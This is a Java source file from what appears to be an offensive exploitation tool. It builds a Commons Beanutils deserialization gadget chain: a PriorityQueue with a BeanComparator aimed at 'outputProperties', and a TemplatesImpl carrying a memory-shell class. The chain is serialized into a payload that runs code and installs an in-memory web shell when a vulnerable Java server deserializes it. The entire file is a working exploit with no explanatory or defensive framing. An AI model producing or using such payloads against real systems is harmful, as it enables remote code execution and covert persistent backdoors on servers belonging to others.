package sample.exploit.payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.CannotCompileException;
import javassist.NotFoundException;
import org.apache.commons.beanutils.BeanComparator;
import sample.utils.ExpUtils;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsBeanutilsExp {
    public String memShell;
    public Class<?> memShellRunner;

    public CommonsBeanutilsExp(String memShell){
        this.memShell = memShell;
        this.memShellRunner = ExpUtils.getMemShellRunner(memShell);
    }

    public byte[] exploit() throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, ClassNotFoundException, IllegalAccessException {
        TemplatesImpl templates = ExpUtils.getTemplatesImpl(memShell, memShellRunner);
        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("2");
        ExpUtils.setField(comparator, "property", "outputProperties");
        Field field = queue.getClass().getDeclaredField("queue");
        field.setAccessible(true);
        Object[] queryArray =  (Object[]) field.get(queue);
        queryArray[0] = templates;
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(queue);
        oos.flush();
        oos.close();
        return bos.toByteArray();
    }
}
